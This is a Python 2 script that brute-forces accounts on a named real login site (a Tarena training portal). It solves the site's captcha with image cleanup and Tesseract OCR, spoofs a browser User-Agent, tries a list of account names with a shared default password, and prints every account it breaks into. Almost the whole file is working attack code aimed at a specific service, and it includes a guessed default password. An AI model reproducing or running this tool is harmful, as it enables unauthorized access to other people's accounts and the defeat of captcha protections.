# encoding: utf-8
__author__ = 'zhanghe'

import requests
from pyquery import PyQuery as Pq
from PIL import Image
import pytesseract
import time
import os

# 登录页的url
url = 'http://tts5.tarena.com.cn/user/login'
# 有些网站反爬虫，这里用headers把程序伪装成浏览器
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36'}
# 登录需要提交的表单
form_data = {
    'loginName': '',
    'password': '',
    'verify': '',
    'login_type': '0'
}

s = requests.session()


def login():
    """
    登录
    :return:
    """
    response = s.post(url, data=form_data, headers=header)
    return response.content


def get_code_img():
    """
    获取验证码并保存为本地图片
    :return:返回全路经的图片文件名
    """
    img_name = os.path.split(os.path.realpath(__file__))[0] + '/static/verifyCode/' + str(time.time()) + '.jpg'
    img_url = 'http://tts5.tarena.com.cn/verifyCode/getCode.do'
    img_ret = s.get(img_url)
    with open(img_name, 'wb') as f:
        f.write(img_ret.content)
    print img_name
    return img_name


def optimize_img(img_name):
    """
    对图片预处理，提高识别率
    :param img_name:
    :return:
    """
    img = Image.open(img_name)
    # 转化为灰度图像
    img_gray = img.convert('L')
    img_gray.save(img_name)
    # 二值化
    threshold = 220  # 灰度阀值（阀值越高，得到的图像噪点越多；阀值越低，后面获取的有效颜色越少）
    table = []
    for i in range(256):
        if i < 10:
            # 去干扰线的关键（将接近黑色干扰线颜色填充为白色）
            table.append(1)
        elif i < threshold:
            # 将颜色亮度低于阀值的有效颜色填充为黑色
            table.append(0)
        else:
            # 将颜色亮度高于阀值的颜色填充为白色
            table.append(1)
    out = img_gray.point(table, '1')
    out.save(img_name)
    return out


def crop_img(img_name, width=80, height=23, border=1):
    """
    裁剪图片，去掉边框（裁剪边框可减少干扰度，提高识别率）
    :param img_name:图片名称（包含路径）
    :param width:图片宽度
    :param height:图片高度
    :param border:边框厚度
    :return:返回裁剪后的图片对象
    """
    img = Image.open(img_name)
    box = (border, border, width - border*2, height - border*2)
    new_img = img.crop(box)
    new_img.save(img_name)
    return new_img


def optimize_text(text):
    """
    对于识别成特殊符号的 采用该表进行修正
    :return:返回修正后的字符串
    """
    text = text.strip()
    text = text.upper()
    rep = {
        ' ': '',
        '.': '',
        '\'': '',
        ',': '',
        '\\': '',
        '-': '',
        '‘': 'C',
        '$': 'S',
        '):': 'X',
    }
    # TODO:待完善
    for r in rep:
        text = text.replace(r, rep[r])
    return text


def code_img_to_string(img_name):
    """
    图片转为字符串
    :param img_name:
    :return:
    """
    # 图片裁剪
    crop_img(img_name)
    # 图片优化
    img = optimize_img(img_name)
    # 图片识别
    text = pytesseract.image_to_string(img)
    # 文本优化
    new_text = optimize_text(text)
    print text
    print new_text
    return new_text


def try_account(id_list, default_pass):
    """
    暴力破解帐号密码
    :param id_list:帐号列表
    :param default_pass:默认密码
    :return:
    """
    for id_item in id_list:
        form_data['loginName'] = str(id_item)  # 将用户名填入表单
        form_data['password'] = default_pass  # 将密码填入表单
        code_img_name = get_code_img()
        code_str = code_img_to_string(code_img_name)
        form_data['verify'] = code_str  # 验证码填入表单
        result = login()  # 登录，获取返回的 response 结果
        print form_data
        err_msg = Pq(result).find('.login_panel .ul_login li:eq(4) span').text()
        print err_msg.decode('utf-8')
        if err_msg == u'验证码错误':
            # 获取验证码重新登录
            code_img_name = get_code_img()
            code_str = code_img_to_string(code_img_name)
            form_data['verify'] = code_str
            result = login()
        if err_msg == u'用户名或者密码错误':
            continue
        if err_msg is None:
            print '成功破解：' + str(id_item) + "\t" + result  # 打印成功登录的帐号


if __name__ == "__main__":
    ID_LIST = ['xjhpsd_1', 'xjhpsd_2', 'xjhpsd_3', 'xjhpsd_4', 'xjhpsd_5', 'xjhpsd_6']
    DEFAULT_PASS = "xjhtarena"  # 初始密码
    try_account(ID_LIST, DEFAULT_PASS)